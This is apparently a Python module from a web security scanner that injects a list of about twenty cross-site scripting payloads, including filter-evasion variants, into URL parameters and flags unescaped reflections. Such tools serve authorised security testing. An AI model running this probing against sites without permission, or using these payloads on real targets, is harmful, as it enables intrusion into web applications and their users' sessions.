from random import choices, randint
from string import ascii_letters

from requests import get
from requests import packages
from requests.exceptions import ConnectionError, RequestException
from modules.web.query import probe_url


packages.urllib3.disable_warnings()

class XSSScanner:
    def __init__(self, log, console) -> None:
        self.log = log
        self.console = console
        self.tested_urls = []
        self.xss_test = [
            r"<script>alert('PAYLOAD')</script>",
            r"\\\";alert('PAYLOAD');//",
            r"</TITLE><SCRIPT>alert('PAYLOAD');</SCRIPT>",
            r"<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('PAYLOAD');\">",
            r"<BR SIZE=\"&{alert('PAYLOAD')}\">",
            r"<%<!--'%><script>alert('PAYLOAD');</script -->",
            r"<ScRiPt>alErT('PAYLOAD')</sCriPt>",
            r"<IMG SRC=jAVasCrIPt:alert('PAYLOAD')>",
            r"<img src=1 href=1 onerror=\"javascript:alert('PAYLOAD')\"></img>",
            r"<applet onError applet onError=\"javascript:javascript:alert"
            + r"('PAYLOAD')\"></applet onError>",
            r"<scr<script>ipt>alert('PAYLOAD')</scr</script>ipt>",
            r"<<SCRIPT>alert('PAYLOAD');//<</SCRIPT>",
            r"<embed code=javascript:javascript:alert('PAYLOAD');></embed>",
            r"<BODY onload!#$%%&()*~+-_.,:;?@[/|\\]^`=javascript:"
            + r"alert('PAYLOAD')>",
            r"<BODY ONLOAD=javascript:alert('PAYLOAD')>",
            r"<img src=\"javascript:alert('PAYLOAD')\">",
            r"\"`'><script>\\x21javascript:alert('PAYLOAD')</script>",
            r"`\"'><img src='#\\x27 onerror=javascript:alert('PAYLOAD')>",
            r"alert;pg('PAYLOAD')",
            r"¼script¾alert(¢PAYLOAD¢)¼/script¾",
            r"d=\\\"alert('PAYLOAD');\\\\\")\\\";",
            r"&lt;DIV STYLE=\\\"background-image&#58; url(javascript&#058;"
            + r"alert('PAYLOAD'))\\\"&gt;",
        ]

    def exploit_xss(self, base_url, url_params) -> None:
        for index, param in enumerate(url_params):
            param_no_value = param.split("=", 1)[0]
            main_url = f"{base_url}?{param_no_value}"
            if main_url in self.tested_urls:
                continue
            self.tested_urls.append(main_url)
            for test in self.xss_test:
                payload_length = randint(5, 15)
                payload_text = "".join(choices(ascii_letters, k=payload_length))
                payload = test.replace("PAYLOAD", payload_text)
                test_url = probe_url(base_url, url_params, index, payload)

                try:
                    response = get(test_url, verify=False, timeout=10)
                except RequestException:
                    self.log.logger(
                        "error", f"Connection error raised on: {test_url}, skipping"
                    )
                    break
                else:
                    if payload in response.text:
                        self.console.print(
                            f"[red][[/red][green]+[/green][red]][/red]"
                            + f" [white]XSS candidate (unescaped reflection) :[/white] {test_url}"
                        )
                        break

    def test_xss(self, url) -> None:
        """
        Tets for XSS
        """
        base_url, separator, params = url.partition("?")
        if not separator or not params:
            return
        params_dict = params.split("&")
        self.exploit_xss(base_url, params_dict)
